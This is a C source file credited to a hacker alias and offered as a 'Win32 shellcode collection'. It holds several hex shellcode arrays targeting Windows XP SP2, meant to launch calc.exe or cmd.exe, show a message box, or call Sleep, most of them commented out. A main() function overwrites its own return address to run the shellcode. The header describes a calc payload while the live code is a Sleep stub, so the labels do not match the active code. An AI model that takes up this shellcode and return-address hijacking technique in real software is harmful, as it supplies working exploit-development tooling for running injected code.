/*
Author: SkuLL-HacKeR
Big Thx To :  my brothers : Pr0F.SELLiM - ThE X-HaCkEr -  Jiko  - My friends in Morocco
H0ME  : Geeksec.com  & No-exploiT
Email : My@Hotmail.iT & Wizard-skh@hotmail.com
*/

// Win32 Shellcode Collection (calc) 19 bytes
// Shellcode Exec Calc.exe
// Tested on XP SP2 FR

#include "stdio.h"
//~ unsigned char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb"
//~ "\x77\x1d\x80\x7c"    //***LoadLibraryA(libraryname) IN WinXP sp2***
//~ "\x51\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb"
//~ "\x28\xac\x80\x7c"   //***GetProcAddress(hmodule,functionname) IN sp2***
//~ "\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x06\x31\xd2\x52\x51"
//~ "\x51\x52\xff\xd0\x31\xd2\x50\xb8\xa2\xca\x81\x7c\xff\xd0\xe8\xc4\xff"
//~ "\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc2\xff\xff"
//~ "\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc2\xff\xff"
//~ "\xff\x4f\x6d\x65\x67\x61\x37\x4e"
//;

//launch calc.exe with segfault
//~ unsigned char shellcode[] =
//~ "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" 
//~ "\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" 
//~ "\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa" 
//~ "\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96" 
//~ "\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b" 
//~ "\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a" 
//~ "\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83" 
//~ "\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98" 
//~ "\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" 
//~ "\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05" 
//~ "\x7f\xe8\x7b\xca";

// launch cmd.exe marche pas
//~ unsigned char shellcode[] = 
//~ "\x8b\xec\x68\x65\x78\x65"
                        //~ "\x20\x68\x63\x6d\x64\x2e"
                        //~ "\x8d\x45\xf8\x50\xb8\x8D"
                        //~ "\x15\x86\x7C\xff\xd0";

unsigned char shellcode[] = 
//~ "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb"
//~ "\x77\x1d\x80\x7c"    //***LoadLibraryA(libraryname) IN WinXP sp2***
//~ "\x51\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb"
//~ "\x28\xac\x80\x7c"   //***GetProcAddress(hmodule,functionname) IN sp2***
//~ "\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x06\x31\xd2\x52\x51"
//~ "\x51\x52\xff\xd0\x31\xd2\x50\xb8\xa2\xca\x81\x7c\xff\xd0\xe8\xc4\xff"
//~ "\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc2\xff\xff"
//~ "\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc2\xff\xff"
//~ "\xff\x4f\x6d\x65\x67\x61\x37\x4e";                    

//memo


//sleep v1 sec qvec 0
//"\x68\x37\x13\x00\x00" // push 1337h
//"\xb8\x42\x24\x80\x7c" // mov eax, 7c802442h
//"\xff\xd0" //far call eax


//sleep V2 sqns 0
"\x33\xc0"          		// XOR EAX,EAX
"\x66\xb8\x37\x13"     		//MOV AX,1337
"\x50"             			//PUSH EAX   
"\xb8\x42\x24\x80\x7c" 	// mov eax, 7c802442h
"\xff\xd0" 				//far call eax


;

int main ()
{
	printf("Shellcode Length is : %d\n",strlen(shellcode));
	int *ret;
	ret=(int *)&ret+2;
	//printf("end \n");

	(*ret)=(int)shellcode;

	return 0;
}
